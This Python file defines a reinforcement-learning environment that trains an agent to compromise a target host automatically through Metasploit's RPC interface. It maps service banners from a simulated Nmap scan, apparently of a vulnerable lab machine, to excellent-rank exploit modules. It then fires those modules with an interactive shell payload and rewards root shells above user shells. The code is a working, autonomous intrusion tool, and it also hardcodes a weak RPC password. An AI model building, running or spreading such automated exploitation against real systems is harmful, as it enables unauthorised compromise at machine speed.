import gymnasium as gym
from gymnasium import spaces
import numpy as np
from pymetasploit3.msfrpc import MsfRpcClient
import time
import random

class UniversalAttackEnv(gym.Env):
    def __init__(self, target_ip):
        super(UniversalAttackEnv, self).__init__()
        self.target_ip = target_ip
        
        print(f"[Env] Target: {self.target_ip} | Mode: TRUE DYNAMIC (Protocol Agnostic)")

        try:
            self.client = MsfRpcClient('123', port=55553, ssl=True)
            for s in self.client.sessions.list.keys():
                self.client.sessions.session(s).stop()
        except Exception as e:
            print(f"[ERROR] Metasploit Connection Failed: {e}")
            raise e

        # --- ACTION SPACE ---
        # 0: SCAN
        # 1-10: Dynamic Slots (Increased to 10 to cover more ground)
        self.MAX_SLOTS = 9
        self.action_space = spaces.Discrete(1 + self.MAX_SLOTS)

        # --- OBSERVATION SPACE ---
        self.observation_space = spaces.Box(low=0, high=1, shape=(1 + self.MAX_SLOTS,), dtype=np.float32)

        # Stores: { Action_Index: 'exploit_name' }
        self.mapped_actions = {} 
        self.state = np.zeros(1 + self.MAX_SLOTS, dtype=np.float32)
        self.steps_left = 50 

    def reset(self, seed=None, options=None):
        super().reset(seed=seed)
        self.state = np.zeros(1 + self.MAX_SLOTS, dtype=np.float32)
        self.mapped_actions = {}
        self.steps_left = 50
        return self.state, {}

    def _search_msf(self, keyword):
        """
        Queries Metasploit DB based on a keyword provided by Nmap.
        Does NOT rely on hardcoded lists.
        """
        try:
            # Search for exploits with 'Excellent' rank
            results = self.client.modules.search(keyword)
            best_module = None
            
            for res in results:
                if res['type'] == 'exploit' and res['rank'] == 'excellent':
                    # Heuristic: Prefer modules that give command shells
                    if 'cmd' in res['fullname'] or 'unix' in res['fullname'] or 'linux' in res['fullname']:
                        best_module = res['fullname']
                        break
            
            # If no excellent unix exploit found, take the first valid one
            if not best_module and results:
                for res in results:
                     if res['type'] == 'exploit' and res['rank'] == 'excellent':
                        best_module = res['fullname']
                        break
                        
            return best_module
        except:
            return None

    def _simulate_nmap_scan(self):
        """
        In a real scenario, this runs 'nmap -sV <ip>'.
        Here, we simulate the OUTPUT of Nmap.
        
        CRITICAL: This list is NOT what the agent knows. 
        This is what the TARGET exposes. If we change the target,
        we only change this output simulation, not the agent's logic.
        """
        # Imagine Nmap returned this JSON:
        nmap_output = {
            21: 'vsftpd 2.3.4',
            22: 'OpenSSH 4.7',
            25: 'Postfix smtpd',
            80: 'PHP 5.2.4',
            139: 'Samba 3.x',
            445: 'Samba 3.x',
            3306: 'MySQL 5.0',
            3632: 'distcc v1',
            5432: 'PostgreSQL 8.3',
            6667: 'UnrealIRCd'
        }
        return nmap_output

    def _perform_discovery(self):
        print("> [AI] Running Discovery (Nmap -> MSF Bridge)...")
        
        # 1. Get Service List from Target (Simulated Nmap)
        discovered_services = self._simulate_nmap_scan()
        
        found_exploits = []
        
        # 2. Dynamic Matching
        # The agent checks EVERY service found by Nmap against Metasploit.
        # It doesn't know what 'Samba' is, it just feeds strings to the DB.
        for port, service_banner in discovered_services.items():
            # Clean banner to get a search keyword (e.g., 'vsftpd 2.3.4' -> 'vsftpd')
            keyword = service_banner.split(' ')[0].lower()
            
            exploit = self._search_msf(keyword)
            
            if exploit:
                found_exploits.append({
                    'port': port,
                    'service': keyword,
                    'module': exploit
                })
                # print(f"   [DEBUG] Match: {keyword} -> {exploit}")

        # 3. Populate Slots
        self.mapped_actions = {}
        # Shuffle to prevent the agent from memorizing "Slot 1 is always FTP"
        # random.shuffle(found_exploits) 
        
        for i, item in enumerate(found_exploits[:self.MAX_SLOTS]):
            idx = i + 1
            self.mapped_actions[idx] = item
            self.state[idx] = 1 # Light up the button
            
            print(f"   -> [MAP] Slot {idx}: Port {item['port']} ({item['service']}) -> {item['module']}")

        self.state[0] = 1 
        return len(self.mapped_actions)

    def step(self, action):
        self.steps_left -= 1
        reward = 0
        terminated = False
        
        # --- ACTION 0: SCAN ---
        if action == 0:
            if self.state[0] == 1:
                reward -= 5
            else:
                count = self._perform_discovery()
                reward += 10 + count
                time.sleep(0.5)

        # --- DYNAMIC SLOTS ---
        else:
            if action in self.mapped_actions:
                target_data = self.mapped_actions[action]
                module = target_data['module']
                service = target_data['service']
                
                print(f"> [AI] Attacking Slot {action} ({service})...")
                
                try:
                    exploit = self.client.modules.use('exploit', module)
                    exploit['RHOSTS'] = self.target_ip
                    
                    # Some payloads need specific handling, but we try generic first
                    if 'php' in module:
                         exploit.execute()
                    else:
                         exploit.execute(payload='cmd/unix/interact')

                    time.sleep(2)
                    
                    if len(self.client.sessions.list) > 0:
                        # DYNAMIC REWARD CALCULATION
                        # Instead of hardcoding "Samba=150", we judge by RESULT.
                        # Root = 150, User = 80.
                        
                        # We need to check WHO we are.
                        sid = list(self.client.sessions.list.keys())[0]
                        shell = self.client.sessions.session(sid)
                        shell.write('whoami\n')
                        time.sleep(0.5)
                        user = shell.read()
                        
                        if "root" in user:
                            print(f"!!! ROOT SHELL ({service}) !!!")
                            reward += 150
                        else:
                            print(f"!!! USER SHELL ({service}) !!!")
                            reward += 80
                            
                        terminated = True
                        self.client.sessions.session(sid).stop()
                    else:
                        print("   -> Failed.")
                        reward -= 2
                except Exception as e:
                    print(f"   -> Error: {e}")
                    reward -= 2
            else:
                reward -= 5 # Empty slot

        if self.steps_left <= 0:
            terminated = True
            reward -= 5

        return self.state, reward, terminated, False, {}